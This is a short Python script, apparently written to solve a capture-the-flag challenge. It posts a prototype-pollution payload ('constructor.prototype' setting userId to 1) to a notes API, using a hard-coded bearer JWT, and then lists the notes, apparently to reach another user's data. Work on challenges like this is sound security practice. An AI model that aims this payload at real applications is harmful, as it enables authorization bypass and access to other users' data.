import requests

url = "http://exp.cybergame.sk:7021/api/v2/notes"

payload = {
    "title": "test",
    "content": "test",
    "constructor": {
        "prototype": {
            "userId": 1,
            "user_id": 1
        }
    }
}
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Mjg1MCwidXNlcm5hbWUiOiJ0ZXN0X2pzb25fc3BhY2VzXzMiLCJpYXQiOjE3NzU4MzczMjQsImV4cCI6MTc3NTg4MDUyNH0.re3yKufOWTn7LmPIC_OdXgMzUB0wXf98tjJ0T035y20"
headers = {
    "Content-Type": "application/json",
    "Authorization": f"Bearer {token}"
}

r = requests.post(url, json=payload, headers=headers)
print("Create:", r.text)

r2 = requests.get(url, headers=headers)
print("List:", r2.text)
